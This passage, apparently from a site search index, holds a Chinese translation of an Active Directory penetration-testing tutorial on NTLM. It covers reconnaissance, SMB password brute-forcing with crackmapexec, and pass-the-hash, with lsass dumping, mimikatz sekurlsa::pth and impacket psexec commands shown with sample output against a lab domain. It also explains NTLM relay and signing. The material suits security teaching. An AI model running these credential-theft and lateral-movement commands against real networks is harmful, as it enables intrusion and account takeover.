Attacks","text":"<p>\u73b0\u5728\u6211\u4eec\u77e5\u9053\u4e86NTLM\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u4e0b\u9762\u8ba9\u6211\u4eec\u8003\u5bdf\u5982\u4f55\u5c06\u5176\u7528\u4e8e\u6e17\u900f\u6d4b\u8bd5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-recon","title":"NTLM Recon","text":"<p>NTLM\u5bf9\u4e8e\u4fa6\u5bdf\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u5982\u679c\u5728\u534f\u5546\u6d88\u606f\u4e2d\u53d1\u9001\u4e86NTLMSSP_NEGOTIATE_TARGET_INFO\u6807\u5fd7\uff0c\u90a3\u4e48\u670d\u52a1\u5668\u5c06\u5728\u8d28\u8be2\u6d88\u606f\u4e2d\u8fd4\u56de\u7528AvPairs\u586b\u5145\u7684TargetInfo\u5b57\u6bb5\uff0c\u5176\u4e2d\u5305\u542b\u4e0e\u670d\u52a1\u5668\u76f8\u5173\u7684\u591a\u79cd\u4fe1\u606f\uff0c\u5982\u4e3b\u673a\u540d\u548c\u57df\u540d\u7b49\u3002</p> <p></p> <p>NTLM\u8d28\u8be2\u6d88\u606f\u4e2d\u7684\u670d\u52a1\u5668\u4fe1\u606f</p> <p>\u5f53\u6211\u4eec\u53ea\u77e5\u9053\u673a\u5668\u7684IP\uff0c\u5e76\u4e14\u670d\u52a1\u5668\u4e0a\u542f\u7528\u4e86SMB\u6216HTTP\u7b49\u5bf9NTLM\u975e\u5e38\u53cb\u597d\u7684\u670d\u52a1\u65f6\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5bf9\u4e8e\u8bc6\u522b\u673a\u5668\u5c06\u975e\u5e38\u6709\u7528\u3002\u8fd9\u53ef\u7528\u4e8e\u5728\u7f51\u7edc\u4e2d\u5b8c\u6210\u4fdd\u7559\u540d\u79f0\u7684\u89e3\u6790\u3002</p> <p><code>$ ntlm-info smb 192.168.100.0/24  Target: 192.168.100.7 NbComputer: WS02-7 NbDomain: CONTOSO DnsComputer: ws02-7.contoso.local DnsDomain: contoso.local Version: 6.1.7601 OS: Windows 7 | Windows Server 2008 R2  Target: 192.168.100.10 NbComputer: WS01-10 NbDomain: CONTOSO DnsComputer: ws01-10.contoso.local DnsDomain: contoso.local DnsTree: contoso.local Version: 10.0.19041 OS: Windows 10 | Windows Server 2019 | Windows Server 2016</code></p> <p>SMB\u626b\u63cf</p> <p>\u5b83\u65e2\u53ef\u4ee5\u5728\u5185\u90e8\u7f51\u7edc\u4e2d\u4f7f\u7528\uff0c\u4f46\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u4f7f\u7528\uff0c\u56e0\u4e3a\u8bb8\u591aHTTP\u670d\u52a1\u5668\u90fd\u652f\u6301NTLM\uff0c\u5982Outlook Web App\u3002</p> <p>\u5728\u4e92\u8054\u7f51\u4e2d\u4f7f\u7528\u65f6\uff0c\u53ef\u80fd\u4f1a\u6cc4\u9732\u7ec4\u7ec7\u5185\u90e8\u57df\u7684\u540d\u79f0\uff0c\u800c\u8be5\u540d\u79f0\u5bf9\u653b\u51fb\u8005\u6765\u8bf4\u53ef\u80fd\u5f88\u6709\u7528\uff0c\u6bd4\u5982\u7528\u4e8e\u5728github\u4e2d\u641c\u7d22\u5bc6\u94a5\u6216\u5bc6\u7801\u6cc4\u6f0f\uff0c\u6216\u8005\u5728VPN\u7f51\u5173\u9762\u677f\u4e2d\u4f7f\u7528\u5b83\u8fdb\u884c\u86ee\u529b\u653b\u51fb\u3002</p> <p>\u4e3a\u4e86\u68c0\u7d22NTLM\u4fe1\u606f\uff0c\u53ef\u4ee5\u4f7f\u7528NTLMRecon\uff08\u53ef\u4ee5\u6267\u884cHTTP\u8def\u5f84bruteforcing\uff09\u6216ntlm-info\uff08\u652f\u6301HTTP\u548cSMB\uff09\u7b49\u5de5\u5177\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2aWordList\uff08https://gitlab.com/Zer1t0/barrido/-/blob/master/wordlists/ntlm.txt\uff09\u6765\u8bc6\u522b\u652f\u6301NTLM\u7684Web\u7aef\u70b9\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-brute-force","title":"NTLM brute-force","text":"<p>\u7531\u4e8eNTLM\u662f\u4e00\u79cd\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u652f\u6301\u7684\u5e94\u7528\u7a0b\u5e8f\u534f\u8bae\u6765\u6d4b\u8bd5\u7528\u6237\u51ed\u636e\u6216\u53d1\u8d77\u86ee\u529b\u653b\u51fb\u3002\u653b\u51fb\u8005\u901a\u5e38\u4f1a\u4f7f\u7528SMB\u534f\u8bae\uff0c\u56e0\u4e3a\u5b83\u5728Windows\u673a\u5668\u4e2d\u53ef\u7528\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f7f\u7528MSSQL\u6216HTTP\u7b49\u5176\u4ed6\u534f\u8bae\u3002</p> <p>\u4f7f\u7528NTLM\u53d1\u52a8\u86ee\u529b\u653b\u51fb\u65f6\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8ehydra\u3001nmap\u3001cme\u6216invoke-bruteForce.ps1\u7b49\u5de5\u5177\u3002</p> <p><code>$ cme smb 192.168.100.10 -u anakin -p passwords.txt  SMB         192.168.100.10  445    WS01-10          [*] Windows 10.0 Build 19041 x64 (name:WS01-10) (domain:contoso.local) (signing:False) (SMBv1:False) SMB         192.168.100.10  445    WS01-10          [-] contoso.local\\anakin:1234 STATUS_LOGON_FAILURE  SMB         192.168.100.10  445    WS01-10          [-] contoso.local\\anakin:Vader! STATUS_LOGON_FAILURE  SMB         192.168.100.10  445    WS01-10          [+] contoso.local\\anakin:Vader1234! (Pwn3d!)</code></p> <p>\u57fa\u4e8ecme\u7684NTLM\u86ee\u529b\u653b\u51fb\u793a\u4f8b</p> <p>\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u5bf9\u5355\u4e2a\u5e10\u6237\u6d4b\u8bd5\u8fc7\u591a\u7684\u5bc6\u7801\uff0c\u53ef\u80fd\u4f1a\u88ab\u5b89\u5168\u7cfb\u7edf\u6240\u62e6\u622a\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cSMB\u5bf9AUTHENTICATE\u6d88\u606f\u7684\u54cd\u5e94\u5c06\u5305\u542b\u4ee3\u7801STATUS_ACCOUNT_LOCKED_OUT\u3002</p> <p>\u6b64\u5916\uff0c\u8fdb\u884c\u86ee\u529b\u653b\u51fb\u8fd8\u4f1a\u4ea7\u751f\u5927\u91cf\u7f51\u7edc\u6d41\u91cf\uff0c\u7279\u522b\u662f\u9488\u5bf9Active Directory\u5e10\u6237\u65f6\uff0c\u56e0\u4e3a\u76ee\u6807\u8ba1\u7b97\u673a\u9700\u8981\u6839\u636eDC\u9a8c\u8bc1\u51ed\u636e\u3002</p> <p>\u6b64\u5916\uff0cWindows-ATA\u8fd8\u53ef\u4ee5\u68c0\u6d4b\u9488\u5bf9\u57df\u5e10\u6237\u7684\u86ee\u529b\u653b\u51fb\uff0c\u56e0\u4e3a\u8be5\u89e3\u51b3\u65b9\u6848\u5c06\u68c0\u67e5\u53d1\u9001\u5230DC\u7684\u6240\u6709\u901a\u4fe1\u6d41\u91cf\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#pass-the-hash","title":"Pass the hash","text":"<p>\u53e6\u4e00\u4e2a\u4f7f\u7528NTLM\u534f\u8bae\u7684\u8457\u540d\u653b\u51fb\u6280\u672f\u662fPass-The-Hash\uff08PtH\uff09\u3002\u6b63\u5982\u4f60\u53ef\u80fd\u6ce8\u610f\u5230\u7684\uff0cNTLM\u6839\u636e\u5ba2\u6237/\u7528\u6237\u7684NT\u54c8\u5e0c\u8ba1\u7b97NTLM\u54c8\u5e0c\u503c\u548c\u4f1a\u8bdd\u5bc6\u94a5\u3002\u56e0\u6b64\uff0c\u5982\u679c\u653b\u51fb\u8005\u77e5\u9053\u5ba2\u6237\u7684NT\u54c8\u5e0c\u503c\uff0c\u4ed6\u5c31\u53ef\u4ee5\u5728NTLM\u8ba4\u8bc1\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u54c8\u5e0c\u503c\u6765\u5192\u5145\u5ba2\u6237\uff0c\u5373\u4f7f\u662f\u5728\u660e\u6587\u5bc6\u7801\u672a\u77e5\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u662f\u5982\u6b64\u3002</p> <p>\u8fd9\u79cd\u653b\u51fb\u73b0\u5728\u5df2\u7ecf\u5f88\u96be\u5f97\u624b\u4e86\uff0c\u56e0\u4e3aMicrosoft\u5df2\u7ecf\u63d0\u4f9b\u4e86\u8bb8\u591a\u4fdd\u62a4\u63aa\u65bd\uff0c\u53ef\u4ee5\u9632\u6b62mimikatz\u7b49\u5de5\u5177\u4ecelsass\u8fdb\u7a0b\u4e2d\u68c0\u7d22\u660e\u6587\u5bc6\u7801\u3002\u4f46\u662f\uff0c\u4ecd\u7136\u53ef\u4ee5\u63d0\u53d6\u7528\u6237\u5e10\u6237\u7684NT\u54c8\u5e0c\u503c\uff0c\u9664\u975e\u542f\u7528\u4e86\u51ed\u636e\u4fdd\u62a4\uff08\u4f46\u4e5f\u53ef\u4ee5\u7ed5\u8fc7\uff09\u3002</p> <p>\u8981\u4ecelsass\u4e2d\u63d0\u53d6NT\u54c8\u5e0c\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528mimikatz sekurlsa::logonpasswords\u547d\u4ee4\u3002\u6216\u8005\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528procdump\u3001sqldumper\u6216\u5176\u4ed6\u5de5\u5177\u8f6c\u50a8lsass\u8fdb\u7a0b\uff0c\u5e76\u5c06\u8f6c\u50a8\u590d\u5236\u5230\u672c\u5730\u8ba1\u7b97\u673a\uff0c\u4ee5\u4fbf\u4f7f\u7528mimikatz\u3001pypykatz\u8bfb\u53d6\u5b83\uff0c\u6216\u8005\u4f7f\u7528LSassy\u8fdc\u7a0b\u8bfb\u53d6\u8f6c\u50a8\u3002</p> <p>\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u4ece\u57df\u63a7\u5236\u5668\u4e2d\u7684\u672c\u5730SAM\u6570\u636e\u5e93\u6216NTDS.dit\u6570\u636e\u5e93\u4e2d\u63d0\u53d6NT\u54c8\u5e0c\u503c\u3002</p> <p>\u5728Windows\u8ba1\u7b97\u673a\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u4f7f\u7528mimikatz\u5728\u8fdb\u7a0b\u4e2d\u6ce8\u5165NT\u54c8\u5e0c\u503c\uff0c\u4ee5\u4fbf\u7528\u5185\u7f6e\u5de5\u5177\u6216PsExec\u7b49IT\u5de5\u5177\u5bf9\u8fdc\u7a0b\u673a\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u5de5\u5177\uff0c\u5982Invoke-TheHash\u5957\u4ef6\uff0c\u53ef\u4ee5\u5c06NT\u54c8\u5e0c\u503c\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u8fdb\u884c\u4f20\u9012\u3002</p> <p><code>PS C:\\Users\\Anakin\\Downloads&gt; .\\mimikatz.exe    .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29  .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)  ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/  mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863 user    : Administrator domain  : contoso.local program : cmd.exe impers. : no NTLM    : b73fdfe10e87b4ca5c0d957f81de6863   |  PID  1080   |  TID  2664   |  LSA Process is now R/W   |  LUID 0 ; 2124820 (00000000:00206c14)   \\_ msv1_0   - data copy @ 000001E6F01AE490 : OK !   \\_ kerberos - data copy @ 000001E6EF86CCD8    \\_ des_cbc_md4       -&gt; null    \\_ des_cbc_md4       OK    \\_ des_cbc_md4       OK    \\_ des_cbc_md4       OK    \\_ des_cbc_md4       OK    \\_ des_cbc_md4       OK    \\_ des_cbc_md4       OK    \\_ *Password replace @ 000001E6F01D7E38 (32) -&gt; null</code></p> <p>\u7528mimikatz\u53d1\u52a8Pass-The-Hash\u653b\u51fb</p> <p>\u6ce8\u610f\uff0c\u5f53\u6ce8\u5165\u5176\u4ed6\u7528\u6237\u7684NT\u54c8\u5e0c\u503c\uff08\u6216Kerberos\u7968\u8bc1\uff09\u65f6\uff0c\u53ea\u80fd\u5728\u8fdc\u7a0b\u8fde\u63a5\u4e2d\u5192\u5145\u5176\u4ed6\u7528\u6237\uff0c\u800c\u4e0d\u662f\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4e2d\u5192\u5145\u5176\u4ed6\u7528\u6237\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u8981\u5728Linux\u673a\u5668\u4e0a\u6267\u884cPass-The-Hash\u653b\u51fb\uff0c\u53ef\u4ee5\u4f7f\u7528impacket\u5957\u4ef6\uff0c\u5176\u811a\u672c\u53ef\u4ee5\u76f4\u63a5\u63a5\u53d7NT\u54c8\u5e0c\u503c\u4f5c\u4e3a\u53c2\u6570\u4f7f\u7528\u3002</p> <p><code>$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  [*] Requesting shares on 192.168.100.10..... [*] Found writable share ADMIN$ [*] Uploading file WFKqIQpM.exe [*] Opening SVCManager on 192.168.100.10..... [*] Creating service AoRl on 192.168.100.10..... [*] Starting service AoRl..... [!] Press help for extra shell commands The system cannot find message text for message number 0x2350 in the message file for Application.  (c) Microsoft Corporation. All rights reserved. b'Not enough memory resources are available to process this command.\\r\\n' C:\\Windows\\system32&gt;whoami nt authority\\system</code></p> <p>\u4f7f\u7528impacket\u4e2d\u7684psexec.py\u811a\u672c\u53d1\u52a8Pass-The-Hash\u653b\u51fb</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-relay","title":"NTLM Relay","text":"<p>\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u8ba8\u8bba\u4e0eNTLM\u76f8\u5173\u7684\u6700\u8457\u540d\u7684\u653b\u51fb\u4e4b\u4e00\uff0c\u5373NTLM\u4e2d\u7ee7\u653b\u51fb\u3002</p> <p>\u8981\u83b7\u5f97\u5173\u4e8eNTLM\u4e2d\u7ee7\u653b\u51fb\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u67e5\u770b\u8fd9\u7bc7\u6587\u7ae0\uff08https://en.hackndo.com/ntlm-relay/\uff09\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a\u5f88\u68d2\u7684NTLM\u4e2d\u7ee7\u77e9\u9635\u3002</p> <p>\u8fdb\u884cNTLM\u4e2d\u7ee7\u653b\u51fb\u65f6\uff0c\u653b\u51fb\u8005\u4f1a\u6267\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u5e76\u5229\u7528\u5176\u4e2d\u95f4\u4eba\u4f4d\u7f6e\u5c06NTLM\u8eab\u4efd\u9a8c\u8bc1\u91cd\u5b9a\u5411\u5230\u5176\u611f\u5174\u8da3\u7684\u670d\u52a1\u5668\uff0c\u4ee5\u83b7\u5f97\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u3002</p> <pre><code>`client                 attacker               server       |                       |                     |       |                       |                -----|--.       |     NEGOTIATE         |     NEGOTIATE       |  |       | --------------------&gt; | ------------------&gt; |  |       |                       |                     |  |       |     CHALLENGE         |     CHALLENGE       |  |&gt; NTLM Relay       | &lt;-------------------- | &lt;------------------ |  |       |                       |                     |  |        |     AUTHENTICATE      |     AUTHENTICATE    |  |       | --------------------&gt; | ------------------&gt; |  |       |                       |                -----|--'       |                       |    application      |       |                       |     messages        |       |                       | ------------------&gt; |       |                       |                     |       |                       | &lt;------------------ |       |                       |                     |       |                       | ------------------&gt; |       |                       |                     |`\n</code></pre> <p>NTLM\u4e2d\u7ee7\u653b\u51fb</p> <p>NTLM\u4e2d\u7ee7\u653b\u51fb\u7684\u7f3a\u9677\u662f\uff0c\u5373\u4f7f\u653b\u51fb\u8005\u901a\u8fc7\u4e86\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5b83\u4e5f\u65e0\u6cd5\u77e5\u9053\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u800c\u4f1a\u8bdd\u5bc6\u94a5\u5728\u4f20\u8f93\u4e2d\u662f\u52a0\u5bc6\u8fc7\u7684\uff0c\u800c\u5728\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u548c/\u6216\u52a0\u5bc6\uff08\u5bc6\u5c01\uff09\u65f6\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u8be5\u5bc6\u94a5\u3002\u56e0\u6b64\uff0c\u5982\u679c\u7b7e\u540d\u662f\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u901a\u8fc7\u534f\u5546\u65b9\u5f0f\u786e\u5b9a\u7684\u8bdd\uff0c\u653b\u51fb\u8005\u5c06\u65e0\u6cd5\u4e3a\u5e94\u7528\u7a0b\u5e8f\u6d88\u606f\u751f\u6210\u6709\u6548\u7684\u7b7e\u540d\uff0c\u4ece\u800c\u65e0\u6cd5\u4e0e\u670d\u52a1\u5668\u5bf9\u8bdd\uff0c\u4ece\u800c\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002</p> <p>\u4f46\u662f\uff0c\u5373\u4f7f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5e0c\u671b\u534f\u5546\u7b7e\u540d\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u7be1\u6539\u6d88\u606f\u4ee5\u53d6\u6d88\u8fd9\u4e9b\u6807\u5fd7\u7684\u8bbe\u7f6e\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0cAUTHENTICATE\u6d88\u606f\u5305\u62ec\u4e86\u4e00\u4e2aMIC\uff0c\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e\u6240\u6709NTLM\u6d88\u606f\u7684\u7b7e\u540d\u3002\u6700\u540e\uff0c\u5982\u679c\u670d\u52a1\u5668\u68c0\u67e5MIC\u5e76\u4e0e\u539f\u59cb\u6d88\u606f\u7684\u7b7e\u540d\u4e0d\u4e00\u81f4\uff0c\u5219\u4e2d\u6b62\u8fde\u63a5\u3002</p> <p>\u7136\u800c\uff0c\u7531\u4e8e\u5b83\u662f\u4e00\u4e2a\u53ef\u9009\u5b57\u6bb5\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5220\u9664MIC\u5e76\u66f4\u6539\u76f8\u5173\u6807\u5fd7\uff0c\u4ee5\u6307\u51faMIC\u5e76\u4e0d\u5b58\u5728\uff08\u65e0\u6cd5\u4fee\u6539MIC\uff0c\u56e0\u4e3a\u5b83\u662f\u7528\u4f1a\u8bdd\u5bc6\u94a5\u8ba1\u7b97\u51fa\u6765\u7684\uff09\u3002</p> <p>\u56e0\u6b64\uff0c\u4e3a\u4e86\u4fdd\u62a4MIC\uff0cNTLMv2\u4f1a\u4f7f\u7528AUTHENTICATE\u6d88\u606f\u4e2d\u7684AvPairs\u503c\uff08\u5305\u62ecMIC\u6807\u5fd7\uff09\u6765\u8ba1\u7b97\u8d28\u8be2\u54cd\u5e94\u3002\u5982\u679c\u653b\u51fb\u8005\u4fee\u6539\u4e86\u8868\u793aAvPairs\u4e2d\u662f\u5426\u5b58\u5728MIC\u7684\u6807\u5fd7\uff0c\u5219\u76ee\u6807\u670d\u52a1\u5668\u4e2d\u7684\u8d28\u8be2\u54cd\u5e94\u68c0\u67e5\u5c06\u5931\u8d25\uff0c\u4f1a\u8bdd\u5c06\u7ed3\u675f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cNTLMv1\u5e76\u6ca1\u6709\u5bf9MIC\u63d0\u4f9b\u4fdd\u62a4\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u6d88\u606f\u7be1\u6539\u653b\u51fb\u3002</p> <p>\u4ee4\u4eba\u597d\u5947\u7684\u662f\uff0c\u5728CVE-2015-005\u6f0f\u6d1e\u4e4b\u524d\uff0c\u5982\u679c\u5c06NTLM\u4e0e\u57df\u5e10\u6237\u4e00\u8d77\u4f7f\u7528\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u901a\u8fc7Netlogon\u8c03\u7528\uff08NetrLogonSamLogonWithFlags\uff09\u8981\u6c42DC\u9a8c\u8bc1AUTHENTICATE\u6d88\u606f\u5e76\u8fd4\u56de\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u7ed5\u8fc7\u7b7e\u540d\u9650\u5236\u3002</p> <p>\u5c3d\u7ba1\u5982\u6b64\uff0c\u6e38\u620f\u8fd8\u8fdc\u672a\u7ed3\u675f\u3002NTLM\u4e0d\u4ec5\u5141\u8bb8\u4f7f\u7528NTLM\u6807\u5fd7ntlmssp_negotiate_sign\u6765\u534f\u5546\u7b7e\u540d\uff0c\u800c\u4e14\u8fd8\u5141\u8bb8\u7531\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u6765\u8fdb\u884c\u8bbe\u7f6e\u3002\u4f46\u662f\uff0c\u5373\u4f7f\u4e24\u8005\u90fd\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u6807\u5fd7\uff0c\u4e5f\u65e0\u6cd5\u4fdd\u8bc1\u7b7e\u540d\u4e00\u5b9a\u4f1a\u88ab\u5e94\u7528\u3002\u56e0\u4e3a\u8fd9\u53d6\u51b3\u4e8e\u5e94\u7528\u7a0b\u5e8f\u534f\u8bae\u3002\u53e6\u5916\uff0c\u901a\u5e38\u4f1a\u67093\u79cd\u4e0d\u540c\u7684\u7b7e\u540d\u72b6\u6001\uff1aNot Supported\u3001Supported\u548cRequired\u3002</p> <p>\u4f8b\u5982\uff0c\u5728SMB\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u5305\u62ec\u81ea\u5df1\u7684\u7b7e\u540d\u6807\u5fd7(SecurityMode)\uff0c\u7528\u4e8e\u786e\u5b9a\u662f\u5426\u652f\u6301/\u9700\u8981\u7b7e\u540d\u3002\u56e0\u6b64\uff0c\u5728SMB\u901a\u4fe1\u4e2d\uff0cNTLM\u6807\u5fd7NTLMSSP_NEGOTIATE_SIGN\u88ab\u8bbe\u7f6e\u4e3a\u8868\u793a\u652f\u6301\u7b7e\u540d\uff0c\u4f46\u6709\u5fc5\u8981\u68c0\u67e5SMB\u6807\u5fd7\uff0c\u4ee5\u786e\u5b9a\u901a\u4fe1\u662f\u5426\u8981\u7b7e\u540d\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u884c\u4e3a\u662f\u56e0SMB\u7248\u672c\u800c\u5f02\u7684\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u5c06\u5411\u60a8\u63d0\u4f9bSMB\u7b7e\u540d\u77e9\u9635\uff08https://en.hackndo.com/ntlm-relay/#signature-matrix\uff09\u7684\u526f\u672c\u3002</p> <p>\u5bf9\u4e8eSMB1\u6765\u8bf4\uff0c\u67093\u79cd\u7b7e\u540d\u72b6\u6001\uff1aDisabled\u3001Enabled\u4e0eRequired\u3002</p> <p></p> <p>SMB1\u7b7e\u540d\u77e9\u9635</p> <p></p> <p>SMB2\u7b7e\u540d\u77e9\u9635</p> <p>\u6b63\u5982\u60a8\u6240\u770b\u5230\u7684\uff0c\u5728SMB1\u548cSMB2\u4e2d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5ba2\u6237\u7aef\u542f\u7528\u4e86\u7b7e\u540d\uff08\u4f46\u4e0d\u662f\u5fc5\u9700\u7684\uff09\uff0c\u56e0\u6b64\u8bbe\u7f6e\u4e86NTLM\u6807\u5fd7NTLMSSP_NOGECIATE_SIGN\u3002\u4f46\u662f\uff0c\u9664\u4e86\u603b\u662f\u9700\u8981SMB\u7b7e\u540d\u7684DC\u4e4b\u5916\uff0c\u670d\u52a1\u5668\u5728SMB2\u4e2d\u53ea\u8bbe\u7f6e\u4e86NTLMSSP_NEGOTIATE_SIGN\u6807\u5fd7\u3002\u5728\u6267\u884c\u8de8\u534f\u8baeNTLM\u4e2d\u7ee7\u653b\u51fb\u65f6\uff0c\u5fc5\u987b\u6ce8\u610f\u4e00\u70b9\u3002</p> <p>\u4f7f\u7528NTLM\u7684\u53e6\u4e00\u4e2a\u5e38\u89c1\u534f\u8bae\u662fLDAP\uff0c\u5b83\u4e5f\u6709\u4e09\u4e2a\u7ea7\u522b\u7684\u7b7e\u540d\uff1aRequired\u3001Enabled\u4e0eDisabled\u3002\u4f46\u662f\uff0c\u4e0eSMB\u4e0d\u540c\u7684\u662f\uff0cLDAP\u534f\u8bae\u6ca1\u6709\u7b7e\u540d\u6807\u5fd7\uff0c\u56e0\u6b64\u534f\u5546\u662f\u57fa\u4e8eNTLM\u7684NTLMSSP_NEGOTIATE_SIGN\u6807\u5fd7\u7684\u2014\u2014\u5728\u81f3\u5c11\u652f\u6301/\u542f\u7528LDAP\u7684\u60c5\u51b5\u4e0b\uff0c\u8be5\u6807\u5fd7\u5c31\u4f1a\u88ab\u8bbe\u7f6e\u3002\u4ee5\u4e0b\u77e9\u9635\u5217\u51fa\u4e86\u8fd9\u4e9b\u60c5\u51b5\uff1a</p> <p></p> <p>LDAP\u7b7e\u540d\u77e9\u9635</p> <p>\u5b9e\u9645\u4e0a\uff0c\u901a\u8fc7GPOS\u5c31\u53ef\u4ee5\u4fee\u6539\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7684LDAP\u7b7e\u540d\u914d\u7f6e\u3002</p> <p>\u6b63\u5982\u60a8\u6240\u770b\u5230\u7684\uff0c\u5f53\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u90fd\u542f\u7528\u4e86\u7b7e\u540d\uff08\u8fd9\u610f\u5473\u7740\u652f\u6301\u7b7e\u540d\uff09\u65f6\uff0c\u901a\u4fe1\u5c31\u88ab\u7b7e\u540d\u4e86\u3002\u6b64\u5916\uff0c\u5fc5\u987b\u8003\u8651\u5230DC\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5e76\u4e0d\u5f3a\u5236\u8fdb\u884cLDAP\u7b7e\u540d\uff0c\u56e0\u6b64\uff0c\u5ba2\u6237\u7aef\u662f\u53ef\u4ee5\u4e0eDC\u5efa\u7acb\u672a\u7b7e\u540d\u7684\u4f1a\u8bdd\u7684\u3002</p> <p>\u6709\u4e86\u8fd9\u4e9b\u4fe1\u606f\uff0c\u5c31\u53ef\u4ee5\u63a8\u65ad\u51fa\u8de8\u534f\u8bae\u4e2d\u7ee7\u653b\u51fb\u53ef\u4ee5\u5728LDAP\u5230SMB2\uff08\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\u4e4b\u95f4\u5b8c\u6210\uff0c\u4f46\u65e0\u6cd5\u5728SMB2\u5230LDAP\u4e4b\u95f4\u5b9e\u65bd\u3002</p> <pre><code>`client &lt;-----SMB2----&gt; attacker &lt;----LDAP---&gt; server       |                       |                     |       |                       |                -----|--.       |   NEGOTIATE SIGN=1    |  NEGOTIATE SIGN=1   |  |       | --------------------&gt; | ------------------&gt; |  |       |                       |                     |  |       |   CHALLENGE SIGN=1    |  CHALLENGE SIGN=1   |  |&gt; NTLM Relay       | &lt;-------------------- | &lt;------------------ |  |       |                       |                     |  |        |  AUTHENTICATE SIGN=1  | AUTHENTICATE SIGN=1 |  |       | --------------------&gt; | ------------------&gt; | -|---&gt; MIC OK!!        |                       |                -----|--'       |                       |         ||          |       |                       |         vv          |       |                       |    client SIGN = 1  |       |                       |    server SIGN = 1  |       |                       |         ||          |       |                       |         vv          |       |                       |   Signing required  |       |                       |    Attack failed    |       |                       |                     |`\n</code></pre> <p>\u4eceSMB2\u5230LDAP\u7684\u8de8\u534f\u8baeNTLM\u4e2d\u7ee7\uff08\u9ed8\u8ba4\u60c5\u51b5\uff09</p> 